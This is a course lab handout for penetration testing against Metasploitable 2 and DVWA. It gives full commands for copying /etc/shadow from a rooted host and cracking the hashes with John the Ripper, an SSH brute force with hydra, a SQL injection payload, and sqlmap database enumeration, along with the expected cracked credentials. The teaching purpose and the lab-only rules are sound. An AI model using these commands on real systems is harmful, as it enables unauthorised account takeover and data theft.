Part 0b — Password cracking (Week 5 carry-over)

Do first — the authentication-attacks topic we ran out of time for in Week 5, finished at the start of tonight before the web parts.
Goal: turn captured password hashes from the compromised acme-legacy host into working credentials (offline with John the Ripper), then demonstrate an online guess with hydra, and produce minimum proof for a weak-credentials finding.
Starter material: lab-assets/password-cracking/ (crack-commands.sh, pw-small.txt, and clearly labelled fallback files). Primary target: Metasploitable 2 at 192.168.1.200 — you already have a root shell from the Week 5 exploitation.
Do this — OFFLINE (John the Ripper)
# On the LIVE target (you already have root from Week 5):
cp /etc/passwd /root/acme-passwd.txt
cp /etc/shadow /root/acme-shadow.txt
# copy both back to Kali, then:
unshadow acme-passwd.txt acme-shadow.txt > acme-hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt acme-hashes.txt
john --show acme-hashes.txt
What each part of the command means
/etc/passwd lists accounts (no passwords); /etc/shadow holds the hashes and is root-only — which is why we needed root first. unshadow merges the two into the one format John reads; > writes it to acme-hashes.txt. john --wordlist= cracks using rockyou.txt (real leaked passwords); john --show reprints what already cracked from John's pot file.
What you should see (realistic — from known Metasploitable 2 weak accounts)
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ ... [MD5])
msfadmin         (msfadmin)
postgres         (postgres)
user             (user)
service          (service)
batman           (sys)
# john --show:
5 password hashes cracked, 2 left   (root and klog use strong passwords)
What it means
The accounts used dictionary-word passwords, so weak reused credentials fell in seconds. Each plaintext (account) line is a working login you can reuse elsewhere — a single foothold becoming broader access.
Do this — ONLINE (hydra), RoE: in-scope lab host only
# tiny controlled wordlist (already shipped as pw-small.txt)
printf 'msfadmin\nuser\nservice\npassword\n123456\n' > pw-small.txt
hydra -l msfadmin -P pw-small.txt ssh://192.168.1.200
What each part of the command means
-l msfadmin tries one login name; -P pw-small.txt tries each password in the file; ssh://192.168.1.200 names the authorized Secure Shell (SSH) service on the in-scope host. Keep the list tiny and mind lockouts.
What you should see
[22][ssh] host: 192.168.1.200   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
What it means
hydra logged in for real, so the credential is live-verified — but every guess was a genuine SSH login attempt that hits the server's logs, which is why online cracking is far louder than offline.
Minimum proof: ONE screenshot of a cracked credential showing the account name (e.g. the msfadmin line), with the rest of the hashes/plaintext redacted. Do not paste the full cracked list into the report body.
RoE: online guessing is only ever allowed against the in-scope lab host named in the authorization letter. Never a production or third-party service.
Fallback only: if the VM is down, use lab-assets/password-cracking/sample-passwd.txt, sample-shadow.txt and sample-john-output.txt (and crack-commands.sh) — labelled fallback only, not a substitute for the live host.
Checkpoint: one cracked credential captured with its account name, plus a one-line weak-credentials finding (impact + remediation: passphrase policy, MFA, salted slow hashing, lockout) started for Phase 3.

Part A — SQL injection on DVWA

Goal: produce in-band SQLi minimum proof (OWASP A03) and optionally enumerate databases with sqlmap under RoE discipline.
Do this (exact actions)
# Browser (proxied): DVWA → SQL Injection
# User ID field: 1' OR '1'='1
# Click Submit
# In Burp: Proxy → HTTP history → find the sqli request → Send to Repeater
# Confirm multi-row response; save request/response into the Phase 3b template

# Optional enumeration (only if you treat RoE as allowing it in this lab):
sqlmap -u "http://192.168.1.200/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=REDACTED; security=low" \
  -p id --dbs --batch
What each part of the command means
-u is the target URL with the injectable parameter. --cookie sends the session and DVWA security level. -p id limits testing to that parameter. --dbs lists databases. --batch answers prompts with defaults (non-interactive).
What you should see
First name / Surname rows for multiple users on the DVWA page
# sqlmap (optional): available databases include dvwa, information_schema, ...
What it means
The application concatenated input into SQL. Foreign rows are your proof. Stop before bulk --dump unless your written RoE explicitly allows data extraction — tonight minimum proof is enough for the checkpoint.
Fallback only: lab-assets/sample-output/sqli-dvwa-low.txt and sqlmap-dbs.txt.
